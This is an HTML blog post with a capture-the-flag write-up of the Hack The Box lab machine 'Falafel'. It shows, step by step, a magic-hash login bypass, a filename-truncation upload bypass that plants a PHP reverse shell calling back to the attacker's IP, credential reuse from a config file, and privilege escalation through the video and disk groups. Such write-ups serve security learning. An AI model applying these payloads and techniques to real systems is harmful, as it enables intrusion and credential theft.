@@ -1,0 +1,168 @@
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=generator content="Hugo 0.62.1 with theme Tranquilpeak 0.4.7-BETA"><meta name=author content="Christoffer Claesson"><meta name=keywords content><meta name=description content="My writeup of the Hack the box Falafel."><meta property="og:description" content="My writeup of the Hack the box Falafel."><meta property="og:type" content="article"><meta property="og:title" content="Falafel Writeup"><meta name=twitter:title content="Falafel Writeup"><meta property="og:url" content="https://securitybits-io.github.io/2018/06/falafel-writeup/"><meta property="twitter:url" content="https://securitybits-io.github.io/2018/06/falafel-writeup/"><meta property="og:site_name" content="Securitybits.io"><meta property="og:description" content="My writeup of the Hack the box Falafel."><meta name=twitter:description content="My writeup of the Hack the box Falafel."><meta property="og:locale" content="en-us"><meta property="article:published_time" content="2018-06-23T00:00:00"><meta property="article:modified_time" content="2018-06-23T00:00:00"><meta property="article:section" content="Hackthebox"><meta property="article:section" content="CTF"><meta property="article:section" content="Writeup"><meta property="article:tag" content="hackthebox"><meta property="article:tag" content="htb"><meta property="article:tag" content="pentest"><meta property="article:tag" content="ctf"><meta name=twitter:card content="summary"><meta name=twitter:site content="@Securitybits_io"><meta name=twitter:creator content="@Securitybits_io"><meta property="og:image" content="https://securitybits-io.github.io/img/posts/2018/06/falafel-writeup/HTB-Falafel-blog-post.jpg"><meta property="twitter:image" content="https://securitybits-io.github.io/img/posts/2018/06/falafel-writeup/HTB-Falafel-blog-post.jpg"><meta property="og:image" content="https://securitybits-io.github.io/img/posts/2018/06/falafel-writeup/HTB-Falafel-blog-post.jpg"><meta property="twitter:image" content="https://securitybits-io.github.io/img/posts/2018/06/falafel-writeup/HTB-Falafel-blog-post.jpg"><meta property="og:image" content="https://securitybits-io.github.io/img/profile.jpg"><meta property="twitter:image" content="https://securitybits-io.github.io/img/profile.jpg"><title>Falafel Writeup</title><link rel=icon href=https://securitybits-io.github.io/favicon.png><link rel=canonical href=https://securitybits-io.github.io/2018/06/falafel-writeup/><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin=anonymous><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin=anonymous><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin=anonymous><link rel=stylesheet href=https://securitybits-io.github.io/css/style-twzjdbqhmnnacqs0pwwdzcdbt8yhv8giawvjqjmyfoqnvazl0dalmnhdkvp7.min.css></head><body><div id=blog><header id=header data-behavior=5><i id=btn-open-sidebar class="fa fa-lg fa-bars"></i><div class=header-title><a class=header-title-link href=https://securitybits-io.github.io/>Securitybits.io</a></div><a class=header-right-picture href=https://securitybits-io.github.io/#about><img class=header-picture src=https://securitybits-io.github.io/img/profile.jpg alt="Author's picture"></a></header><nav id=sidebar data-behavior=5><div class=sidebar-container><div class=sidebar-profile><a href=https://securitybits-io.github.io/#about><img class=sidebar-profile-picture src=https://securitybits-io.github.io/img/profile.jpg alt="Author's picture"></a><h4 class=sidebar-profile-name>Christoffer Claesson</h4><h5 class=sidebar-profile-bio>Security ramblings from a viking!</h5></div><ul class=sidebar-buttons><li class=sidebar-button><a class=sidebar-button-link href=https://securitybits-io.github.io/><i class="sidebar-button-icon fa fa-lg fa-home"></i><span class=sidebar-button-desc>Home</span></a></li><li class=sidebar-button><a class=sidebar-button-link href=https://securitybits-io.github.io/categories><i class="sidebar-button-icon fa fa-lg fa-bookmark"></i><span class=sidebar-button-desc>Categories</span></a></li><li class=sidebar-button><a class=sidebar-button-link href=https://securitybits-io.github.io/tags><i class="sidebar-button-icon fa fa-lg fa-tags"></i><span class=sidebar-button-desc>Tags</span></a></li><li class=sidebar-button><a class=sidebar-button-link href=https://securitybits-io.github.io/archives><i class="sidebar-button-icon fa fa-lg fa-archive"></i><span class=sidebar-button-desc>Archives</span></a></li><li class=sidebar-button><a class=sidebar-button-link href=https://securitybits-io.github.io/page/about-me><i class="sidebar-button-icon fa fa-lg fa-question"></i><span class=sidebar-button-desc>About Me</span></a></li></ul><ul class=sidebar-buttons><li class=sidebar-button><a class=sidebar-button-link href=https://github.com/Securitybits-io target=_blank rel=noopener><i class="sidebar-button-icon fa fa-lg fa-github"></i><span class=sidebar-button-desc>GitHub</span></a></li><li class=sidebar-button><a class=sidebar-button-link href=https://twitter.com/Securitybits_io target=_blank rel=noopener><i class="sidebar-button-icon fa fa-lg fa-twitter"></i><span class=sidebar-button-desc>Twitter</span></a></li><li class=sidebar-button><a class=sidebar-button-link href=https://keybase.io/securitybits target=_blank rel=noopener><i class="sidebar-button-icon fa fa-lg fa-code-fork"></i><span class=sidebar-button-desc>Keybase.io</span></a></li></ul><ul class=sidebar-buttons><li class=sidebar-button><a class=sidebar-button-link href=https://securitybits-io.github.io/index.xml><i class="sidebar-button-icon fa fa-lg fa-rss"></i><span class=sidebar-button-desc>RSS</span></a></li></ul></div></nav><div class="post-header-cover
+text-center
+post-header-cover--partial" style=background-image:url(/img/posts/2018/06/falafel-writeup/HTB-Falafel-blog-post.jpg) data-behavior=5></div><div id=main data-behavior=5 class="hasCover
+hasCoverMetaOut"><article class=post itemscope itemtype=http://schema.org/BlogPosting><div class="post-header main-content-wrap text-center"><h1 class=post-title itemprop=headline>Falafel Writeup</h1><div class="postShorten-meta post-meta"><time itemprop=datePublished datetime=2018-06-23T00:00:00Z>June 23, 2018</time>
+<span>in</span>
+<a class=category-link href=https://securitybits-io.github.io/categories/hackthebox>Hackthebox</a>,
+<a class=category-link href=https://securitybits-io.github.io/categories/ctf>CTF</a>,
+<a class=category-link href=https://securitybits-io.github.io/categories/writeup>Writeup</a></div></div><div class="post-content markdown" itemprop=articleBody><div class=main-content-wrap><blockquote><p>I have discovered a truly marvelous proof of this, which this margin is too narrow to contain.
+-Pierre de Fermat</p></blockquote><p>Let's kick things off with the general purpose portscan using NMAP.</p><pre><code>root@kali:~/Falafel$ nmap -p- -T4 -Pn 10.10.10.73
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-21 09:59 CEST
+Nmap scan report for falafel.htb (10.10.10.73)
+Host is up (0.078s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 387.79 seconds
+</code></pre><p>So SSH(22) and Web(80) are both open, so we are dealing with a web server.
+Lets enumerate the versions.</p><pre><code>root@kali:~/Falafel$ nmap -p22,80 -sV --version-all -Pn 10.10.10.73
+[..snip..]
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+[..snip..]
+</code></pre><p>As well perform a banner grab using Netcat</p><pre><code>root@kali:~/Falafel$ nc 10.10.10.73 80
+GET / HTTP/1.1
+HTTP/1.1 400 Bad Request
+Date: Thu, 21 Jun 2018 15:12:43 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Content-Length: 303
+Connection: close
+Content-Type: text/html; charset=iso-8859-1
+</code></pre><p>Cool, so we are dealing with a web server enumerated and verified the version. Doing a quick check with searchsploit yielded no result, except a user enumeration for OpenSSH Users. Nothing that is extremely interesting for us. Since we don't have a user or password, lets check out the webserver on port 80. Before actually browse to the webpage, lets start a gobuster session to find any hidden directories and files (txt and php).</p><pre><code>root@kali:~/Falafel$ gobuster -u http://10.10.10.73 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50 -x .txt,.php
+</code></pre><p>Now i preface that i use Firefox, and run the connection through Burpsuite Proxy, as you never know what you might pick up. Running the connection through Burpsuite has some other benefits as well, like recording all the requests or automatic spidering.</p><p>Browsing to falafel we see two things, user and domain <a href=mailto:IT@falafel.htb>IT@falafel.htb</a>, and &ldquo;Login&rdquo; which does sound interesting.
+<img src=https://securitybits-io.github.io/img/posts/2018/06/falafel-writeup/Falafel-Lovers---Login-Page---Mozilla-Firefox_061.png alt=Falafel-Lovers&mdash;Login-Page&mdash;Mozilla-Firefox_061>
+Checking the sourcecode does not reveal anything interesting. So lets go back to our gobuster session.</p><pre><code>Gobuster v1.4.1              OJ Reeves (@TheColonial)
+=====================================================
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.10.73/
+[+] Threads      : 50
+[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Status codes : 301,302,307,200,204
+[+] Extensions   : .txt,.php
+=====================================================
+/profile.php (Status: 302)
+/uploads (Status: 301)
+/upload.php (Status: 302)
+/cyberlaw.txt (Status: 200)
+/connection.php (Status: 200)
+[..snip uninteressting stuff..]
+=====================================================
+</code></pre><p>At this point we can make some assumptions on the results.<br>/connection.php - usually exists when theres a database server backend<br>/cyberlaw.txt - contains some interesting usernames; admin, lawyers, devs and chris. But also that the uploads form is vulnerable.<br>/uploads.php - Apparently vulnerable, but is protected by a login form.<br>So with that information, the next step is to try and bypass the login form.
+Generally start with trying some simple SQL Injection techniques, since we did see the /connection.php. As well as scouring stackoverflow for php auth bypasses. None of that worked, so googling continues, when i did find a writeup on Magic Hashes from WhiteHat Security<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup> (Interesting research, i recommend a read through). So what we'll use is a simple hash collision.
+Supplying <code>username=admin&password=240610708</code> to the /login.php site will result in a Login Successful!<br>And now we are presented with /upload.php which from previous information stated, is vulnerable to some kind of file upload bypass. Another assumption is that files uploaded through this form is also added to /uploads/ found with gobuster.
+<img src=https://securitybits-io.github.io/img/posts/2018/06/falafel-writeup/Falafel-Lovers---Image-Upload---Mozilla-Firefox_063.png alt=Falafel-Lovers&mdash;Image-Upload&mdash;Mozilla-Firefox_063>
+Seeing that the upload form cannot browse a file to upload, but rather specify a URL we can start a simple http webserver with python.</p><pre><code>root@kali:~/Falafel$ python -m SimpleHTTPServer 3999
+Serving HTTP on 0.0.0.0 port 3999 ...
+</code></pre><p>Seeing that it requests an image to be uploaded. I reckon thats the first thing i should try, in order to see if it presents me with a link to my uploaded file.
+Uploading &ldquo;http://10.10.14.7:3999/viking.png&rdquo; i get presented with this output.</p><pre><code>CMD: cd /var/www/html/uploads/0621-1924_63b0bd5de1c81bcd; wget 'http://10.10.14.7:3999/viking.png'
+
+--2018-06-21 19:24:49--  http://10.10.14.7:3999/viking.png
+Connecting to 10.10.14.7:3999... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 8889 (8.7K) [image/png]
+Saving to: 'viking.png'
+
+     0K ........                                              100% 19.1M=0s
+
+2018-06-21 19:24:49 (19.1 MB/s) - 'viking.png' saved [8889/8889]
+</code></pre><p>Cool so that is using a tool we should recognize, wget. It also echoes out the folder it saves the image to. A simple browse to <code>http://10.10.10.73/uploads/0621-1924_63b0bd5de1c81bcd/viking.png</code> should then present us with the image.
+<img src=https://securitybits-io.github.io/img/posts/2018/06/falafel-writeup/viking.png--PNG-Image--141---141-pixels----Mozilla-Firefox_065.png alt=viking.png&ndash;PNG-Image&ndash;141&mdash;141-pixels&mdash;-Mozilla-Firefox_065>
+So it gives us both the folder name where it is saved and also we have access to it&mldr; Since it is running a php backend, lets try and upload a reverse shell.</p><pre><code>root@kali:~/Falafel$ cp /usr/share/webshells/php/php-reverse-shell.php ./sb.php
+root@kali:~/Falafel$ sed -i -e 's/127.0.0.1/10.10.14.7/g' sb.php
+root@kali:~/Falafel$ sed -i -e 's/$port = 1234;/$port = 4000;/g' sb.php
+</code></pre><p>Having set the ip and port of my kali box, we should also put up something to catch the shell with netcat.</p><pre><code>root@kali:~/Falafel$ nc -lvvp 4000
+listening on [any] 4000 ...
+</code></pre><p>Trying to upload sb.php using a URL, i get the response:</p><blockquote><p>Something bad happened:
+Bad extension
+Specify a URL of an image to upload:</p></blockquote><p>Running through OWASP's Guide to bypass filtered uploads<sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup>, Didn't really give anything either. So again after some googling, i had the idea that since the upload form is using wget to fetch files. Then maybe supplying a filename longer then linux can handle, maybe we can get it to &ldquo;cut off&rdquo; the picture file ending. Popping over to UnixStackExchange<sup id=fnref:3><a href=#fn:3 class=footnote-ref role=doc-noteref>3</a></sup>, we get to know that a linux filename can be 255 characters long. So maybe if I find a filename that is long enough, that might cause an overflow, thus removing all characters over the limit.
+so i tested with a 245 character long filename, and the response was:</p><pre><code>Upload Succsesful!
+Output:
+CMD: cd /var/www/html/uploads/0621-2200_805b0c016de450a8; wget 'http://10.10.14.7:3999/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.png'
+
+The name is too long, 245 chars total.
+Trying to shorten...
+New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[..snip..]
+</code></pre><p>So now we can see that supplying a 232 character long filename like</p><pre><code>root@kali:~/Falafel$ python -c &quot;print 'A'*232 + '.php' + '.jpg'&quot;
+</code></pre><p>Containing our php code and a &lsquo;GIF89&rsquo; at the beginning, will using the &lsquo;.jpg&rsquo; bypass the image filter, but the script will shorted and cut out the last 4 characters, leaving the file names as &lsquo;A&rsquo;*232 + &lsquo;.php&rsquo;.
+So taking my sb.php reverse shell, and renaming it to the convention</p><pre><code>CMD: cd /var/www/html/uploads/0621-2211_287036c71d5619df; wget 'http://10.10.14.7:3999/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.jpg'
+
+The name is too long, 240 chars total.
+Trying to shorten...
+[..snip..]
+2018-06-21 22:11:25 (338 MB/s) - 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php' saved [3466/3466]
+[..snip..]
+</code></pre><p>Now doing a curl to will trigger the backdoor and kick back a shell.</p><pre><code>root@kali:~/Falafel$ curl http://10.10.10.73/uploads/0621-2211_287036c71d5619df/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php
+</code></pre><pre><code>root@kali:~/Falafel$ nc -lvvp 4000
+listening on [any] 4000 ...
+connect to [10.10.14.7] from falafel.htb [10.10.10.73] 47088
+Linux falafel 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+ 22:15:33 up 3 days, 17:54,  1 user,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+yossi    tty1                      Mon04    3days  0.05s  0.04s -bash
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ bash -i
+www-data@falafel:/$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@falafel:/$
+</code></pre><p>Now that worked fairly terrific! Remember /connection.php that where discovered earlier, lets have a look into that one.</p><pre><code>www-data@falafel:/var/www/html$ cat connection.php
+&lt;?php
+   define('DB_SERVER', 'localhost:3306');
+   define('DB_USERNAME', 'moshe');
+   define('DB_PASSWORD', 'falafel[snip]');
+   define('DB_DATABASE', 'falafel');
+   [..snip..]
+?&gt;
+www-data@falafel:/var/www/html$
+</code></pre><p>Nice DB Creds. Well maybe they are reusing that password?</p><pre><code>root@kali:~/Falafel$ ssh moshe@10.10.10.73
+moshe@10.10.10.73's password: falafel[snip]
+$ bash -i
+moshe@falafel:~$ id
+uid=1001(moshe) gid=1001(moshe) groups=1001(moshe),4(adm),8(mail),9(news),22(voice),25(floppy),29(audio),44(video),60(games)
+moshe@falafel:~$ ls -alsh user.txt
+4.0K -r-------- 1 moshe moshe 33 Nov 27  2017 user.txt
+moshe@falafel:~$
+</code></pre><p>That takes care of the user flag. Time for some further enumeration as user:moshe. Now that we have a ssh shell, lets see whats stored in the DB.</p><pre><code>mysql -u moshe -p
+Enter password: falafel[snip]
+[..snip..]
+mysql&gt; use falafel
+Database changed
+mysql&gt; select * from users;
++----+----------+----------------------------------+--------+
+| ID | username | password                         | role   |
++----+----------+----------------------------------+--------+
+|  1 | admin    | 0e462096931906507119562988736854 | admin  |
+|  2 | chris    | d4ee02a22fc872e36d9e3751ba72ddc8 | normal |
++----+----------+----------------------------------+--------+
+mysql&gt;exit;
+moshe@falafel:~$
+</code></pre><p>Hash cracking time, favorite time!&mldr; Which didn't yield any good results.
+So back to enumeration. checking groups you can see that there was some non-default assigned to moshe</p><pre><code>moshe@falafel:~$ cat /etc/group|grep video
+video:x:44:moshe
+moshe@falafel:~$
+</code></pre><p>Now video is an interesting group, according to Ubuntu Wiki<sup id=fnref:4><a href=#fn:4 class=footnote-ref role=doc-noteref>4</a></sup> <code>The "video" group can access /dev/fb0</code> which is a framebuffer.
+So with that in mind we can run some simple commands and capture the image from fb0. But to be able to convert it into a image we also need the resolution of fb0.</p><pre><code>moshe@falafel:~$ cat /dev/fb0 &gt; /tmp/sb.raw
+moshe@falafel:~$ cat /sys/class/graphics/fb0/virtual_size
+1176,885
+moshe@falafel:~$
+</code></pre><p>Using SCP or your own preference in transferring the image to your own Kali, the script iraw2png.pl<sup id=fnref:5><a href=#fn:5 class=footnote-ref role=doc-noteref>5</a></sup> can be used to convert the &ldquo;raw&rdquo; image to a viewable png. which gets us the user:yossi password.</p><pre><code>ssh yossi@10.10.10.73
+yossi@10.10.10.73's password: Moshe[..snip..]
+yossi@falafel:~$ cat /etc/group | grep disk
+disk:x:6:yossi
+yossi@falafel:~$
+</code></pre><p>Again we see that yossi is in an interesting group &ldquo;disk&rdquo; gives the permission for users in the group to read contents of /dev/sdX.</p><pre><code>yossi@falafel:~$ ls /dev/sda*
+/dev/sda  /dev/sda1  /dev/sda2  /dev/sda5
+yossi@falafel:~$ strings /dev/sda5 | grep root.txt
+[..snip..]
+echo &quot;EatSleepPwnRepeat&quot; &gt; root.txt
+[..snip..]
+yossi@falafel:~$
+</code></pre><p>This was a really interesting box! Done!</p><section class=footnotes role=doc-endnotes><hr><ol><li id=fn:1 role=doc-endnote><p><a href=https://www.whitehatsec.com/blog/magic-hashes/>Magic Hashes</a> <a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:2 role=doc-endnote><p><a href=https://www.owasp.org/index.php/Unrestricted_File_Upload>OWASP Unrestricted File Upload</a> <a href=#fnref:2 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:3 role=doc-endnote><p><a href=https://unix.stackexchange.com/questions/32795/what-is-the-maximum-allowed-filename-and-folder-size-with-ecryptfs>Unix Stack Excange</a> <a href=#fnref:3 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:4 role=doc-endnote><p><a href=https://wiki.ubuntu.com/Security/Privileges>Ubuntu Wikipedia</a> <a href=#fnref:4 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:5 role=doc-endnote><p><a href=https://www.cnx-software.com/2010/07/18/how-to-do-a-framebuffer-screenshot/>iraw2png.pl</a> <a href=#fnref:5 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></section></div></div><div id=post-footer class="post-footer main-content-wrap"><div class=post-actions-wrap><nav><ul class="post-actions post-action-nav"><li class=post-action><a class="post-action-btn btn btn--default tooltip--top" href=https://securitybits-io.github.io/2018/07/valentine-writeup/ data-tooltip="Valentine Writeup"><i class="fa fa-angle-left"></i><span class="hide-xs hide-sm text-small icon-ml">NEXT</span></a></li><li class=post-action><a class="post-action-btn btn btn--default tooltip--top" href=https://securitybits-io.github.io/2018/06/chatterbox-writeup/ data-tooltip="Chatterbox Writeup"><span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+<i class="fa fa-angle-right"></i></a></li></ul></nav><ul class="post-actions post-action-share"><li class="post-action hide-lg hide-md hide-sm"><a class="post-action-btn btn btn--default btn-open-shareoptions" href=#btn-open-shareoptions><i class="fa fa-share-alt"></i></a></li><li class="post-action hide-xs"><a class="post-action-btn btn btn--default" target=new href="https://www.facebook.com/sharer/sharer.php?u=https://securitybits-io.github.io/2018/06/falafel-writeup/"><i class="fa fa-facebook-official"></i></a></li><li class="post-action hide-xs"><a class="post-action-btn btn btn--default" target=new href="https://twitter.com/intent/tweet?text=https://securitybits-io.github.io/2018/06/falafel-writeup/"><i class="fa fa-twitter"></i></a></li><li class="post-action hide-xs"><a class="post-action-btn btn btn--default" target=new href="https://plus.google.com/share?url=https://securitybits-io.github.io/2018/06/falafel-writeup/"><i class="fa fa-google-plus"></i></a></li><li class=post-action><a class="post-action-btn btn btn--default" href=#><i class="fa fa-list"></i></a></li></ul></div></div></article><footer id=footer class=main-content-wrap><span class=copyrights>&copy; 2020 Christoffer Claesson. All Rights Reserved</span></footer></div><div id=bottom-bar class=post-bottom-bar data-behavior=5><div class=post-actions-wrap><nav><ul class="post-actions post-action-nav"><li class=post-action><a class="post-action-btn btn btn--default tooltip--top" href=https://securitybits-io.github.io/2018/07/valentine-writeup/ data-tooltip="Valentine Writeup"><i class="fa fa-angle-left"></i><span class="hide-xs hide-sm text-small icon-ml">NEXT</span></a></li><li class=post-action><a class="post-action-btn btn btn--default tooltip--top" href=https://securitybits-io.github.io/2018/06/chatterbox-writeup/ data-tooltip="Chatterbox Writeup"><span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+<i class="fa fa-angle-right"></i></a></li></ul></nav><ul class="post-actions post-action-share"><li class="post-action hide-lg hide-md hide-sm"><a class="post-action-btn btn btn--default btn-open-shareoptions" href=#btn-open-shareoptions><i class="fa fa-share-alt"></i></a></li><li class="post-action hide-xs"><a class="post-action-btn btn btn--default" target=new href="https://www.facebook.com/sharer/sharer.php?u=https://securitybits-io.github.io/2018/06/falafel-writeup/"><i class="fa fa-facebook-official"></i></a></li><li class="post-action hide-xs"><a class="post-action-btn btn btn--default" target=new href="https://twitter.com/intent/tweet?text=https://securitybits-io.github.io/2018/06/falafel-writeup/"><i class="fa fa-twitter"></i></a></li><li class="post-action hide-xs"><a class="post-action-btn btn btn--default" target=new href="https://plus.google.com/share?url=https://securitybits-io.github.io/2018/06/falafel-writeup/"><i class="fa fa-google-plus"></i></a></li><li class=post-action><a class="post-action-btn btn btn--default" href=#><i class="fa fa-list"></i></a></li></ul></div></div><div id=share-options-bar class=share-options-bar data-behavior=5><i id=btn-close-shareoptions class="fa fa-close"></i><ul class=share-options><li class=share-option><a class=share-option-btn target=new href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fsecuritybits-io.github.io%2F2018%2F06%2Ffalafel-writeup%2F"><i class="fa fa-facebook-official"></i><span>Share on Facebook</span></a></li><li class=share-option><a class=share-option-btn target=new href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fsecuritybits-io.github.io%2F2018%2F06%2Ffalafel-writeup%2F"><i class="fa fa-twitter"></i><span>Share on Twitter</span></a></li><li class=share-option><a class=share-option-btn target=new href="https://plus.google.com/share?url=https%3A%2F%2Fsecuritybits-io.github.io%2F2018%2F06%2Ffalafel-writeup%2F"><i class="fa fa-google-plus"></i><span>Share on Google+</span></a></li></ul></div><div id=share-options-mask class=share-options-mask></div></div><div id=about><div id=about-card><div id=about-btn-close><i class="fa fa-remove"></i></div><img id=about-card-picture src=https://securitybits-io.github.io/img/profile.jpg alt="Author's picture"><h4 id=about-card-name>Christoffer Claesson</h4><div id=about-card-bio>Security ramblings from a viking!</div><div id=about-card-job><i class="fa fa-briefcase"></i><br>Senior Penetration Tester</div><div id=about-card-location><i class="fa fa-map-marker"></i><br>Sweden</div></div></div><div id=cover style=background-image:url(https://securitybits-io.github.io/img/side-banner.jpg)></div><script src=https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin=anonymous></script><script src=https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw=" crossorigin=anonymous></script><script src=https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.7/js/jquery.fancybox.min.js integrity="sha256-GEAnjcTqVP+vBp3SSc8bEDQqvWAZMiHyUSIorrWwH50=" crossorigin=anonymous></script><script src=https://securitybits-io.github.io/js/script-pcw6v3xilnxydl1vddzazdverrnn9ctynvnxgwho987mfyqkuylcb1nlt.min.js></script><script lang=javascript>window.onload=updateMinWidth;window.onresize=updateMinWidth;document.getElementById("sidebar").addEventListener("transitionend",updateMinWidth);function updateMinWidth(){var sidebar=document.getElementById("sidebar");var main=document.getElementById("main");main.style.minWidth="";var w1=getComputedStyle(main).getPropertyValue("min-width");var w2=getComputedStyle(sidebar).getPropertyValue("width");var w3=getComputedStyle(sidebar).getPropertyValue("left");main.style.minWidth=`calc(${w1} - ${w2} - ${w3})`;}</script><script>$(document).ready(function(){hljs.configure({classPrefix:'',useBR:false});$('pre.code-highlight > code, pre > code').each(function(i,block){if(!$(this).hasClass('codeblock')){$(this).addClass('codeblock');}
+hljs.highlightBlock(block);});});</script></body></html>
